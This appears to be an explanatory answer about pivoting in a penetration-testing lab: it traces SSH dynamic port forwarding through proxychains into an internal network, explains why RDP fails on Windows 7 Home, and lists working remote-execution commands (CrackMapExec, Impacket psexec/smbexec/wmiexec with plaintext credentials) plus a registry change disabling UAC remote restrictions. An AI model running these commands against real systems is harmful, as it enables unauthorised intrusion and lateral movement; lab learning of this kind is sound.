**1. Who sets up the listener on 8090?**

The **SSH client on your Kali machine** creates and manages the listener.

* When you execute `ssh -D 8090 ...`, the SSH process on Kali makes a system call to the Linux kernel: `bind(127.0.0.1:8090)` and `listen()`.


* This turns your Kali's local SSH process into an active **SOCKS5 proxy server** listening on `localhost:8090`.


* *Proxychains is completely unaware of this happening at this stage.* Proxychains does not start the proxy; SSH does.



---

**2. Is `ssh -D` connected directly with `proxychains`?**

**No.** They are two independent components that meet at the local socket `127.0.0.1:8090`:

* **`ssh -D 8090`** creates the receiver (the SOCKS proxy socket).


* **`proxychains4.conf`** is just a configuration file telling Proxychains: *"Whenever a command asks you to route traffic, send it to `127.0.0.1:8090`."*


---

**3. Step-by-Step: Where is traffic intercepted and where does it go?**

Let's trace what happens when you run:
`proxychains nmap -sT -Pn -p 445 10.10.10.2`

```text
[ Nmap on Kali ] 
       |
       | 1. Intercepts connect("10.10.10.2:445") via LD_PRELOAD
       v
[ Proxychains ] 
       |
       | 2. Redirects raw request to local SOCKS port (127.0.0.1:8090)
       v
[ Local SSH Client (Kali) ] 
       |
       | 3. Encapsulates SOCKS packet into the encrypted SSH Tunnel
       |    (Sent over DMZ wire to 192.168.50.3:22)
       v
[ Remote SSH Daemon (sshd on Metasploitable) ] 
       |
       | 4. Decrypts SSH packet, extracts target: "Connect to 10.10.10.2:445"
       |    Calls local kernel -> Kernel checks routing table -> Selects eth1 (10.10.10.0/24)
       v
[ Target VM: Domain Controller (10.10.10.2:445) ]

```
---

**4. Why `rdesktop` is failing (`Connection refused` on port 3389)**

Notice the OS version discovered by CrackMapExec:

> `Windows 7 Home Basic 7600 x64`

* **No RDP Host Support in Home Editions:** Microsoft restricts the Remote Desktop Server feature exclusively to Windows **Professional**, **Enterprise**, and **Ultimate** editions. Windows 7 Home Basic/Home Premium cannot accept incoming RDP connections natively.
* Because the RDP service is not running or listening on port `3389`, the Metasploitable pivot host receives an immediate `RST/ACK` (Connection refused) when trying to establish the TCP connection.

---

**5. How to Execute Commands on the Machine Instead of RDP**

Since SMB (`445`) is open and credentials are valid (`karlos` / `windows7`), use tools that execute commands over SMB/WMI without needing RDP:

* **Using CrackMapExec to run commands directly:**
```bash
proxychains crackmapexec smb 10.10.10.4 -u "karlos" -p "windows7" -x "whoami && ipconfig"

```


* **Spawning an interactive command shell via Impacket:**
```bash
proxychains impacket-psexec karlos:windows7@10.10.10.4
# OR
proxychains impacket-smbexec karlos:windows7@10.10.10.4
# OR
proxychains impacket-wmiexec karlos:windows7@10.10.10.4

```
---

**6. Why `psexec` and `crackmapexec -x` failed:**

1. **`impacket-psexec`** requires write access to administrative network shares (`ADMIN$` or `C$`) to upload a temporary service binary (`.exe`) and execute it via the Windows Service Control Manager (`svcctl`).
2. Your user **`karlos`** is either a standard (non-admin) local user or **User Account Control (UAC) Remote Restrictions** are preventing remote administrative token elevation over SMB.
3. Because `ADMIN$` and `C$` are not writable, `psexec` and `crackmapexec -x` (which relies on `smbexec`/`psexec` behind the scenes) fail to drop their payload.

**1. Try WMI Execution (Alternative Execution Vector)**

WMI does not require writing files to `ADMIN$`:

```bash
proxychains impacket-wmiexec karlos:windows7@10.10.10.4

```

**2. Try SMB Shell Execution via Writable Share**

If there is a custom writable share, tell `smbexec` to use that specific share instead of `ADMIN$`:

```bash
proxychains impacket-smbexec karlos:windows7@10.10.10.4

```

**3. Enumerate Available Shares and Permissions**

Check what shares `karlos` actually has read/write permissions on:

```bash
proxychains crackmapexec smb 10.10.10.4 -u "karlos" -p "windows7" --shares
# OR
proxychains impacket-smbclient karlos:windows7@10.10.10.4

```

**4. If Karlos is Supposed to be Admin (Fix UAC Remote Restrictions)**

On standalone Windows workgroup machines, remote non-RID-500 administrators are stripped of admin tokens over the network by default:

1. On the **Windows 7 VM**, open an administrative command prompt.
2. Run this registry command to disable UAC remote restrictions:
```cmd
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f

```


3. Re-run `proxychains impacket-psexec karlos:windows7@10.10.10.4`.





---
---
**Summary of Roles**

* **Kali's `ssh` client:** Listens on port `8090` and acts as the SOCKS proxy entry point.


* **Proxychains:** Intercepts outgoing application connections on Kali and pushes them into port `8090`.


* **Metasploitable (`sshd`):** The exit node that unpacks the request, opens the connection on its internal card (`eth1`), and relays responses back through the tunnel.




If you want GUI access specifically to test `rdesktop`, target your Windows Server Domain Controller (`10.10.10.2`), which natively supports RDP server roles.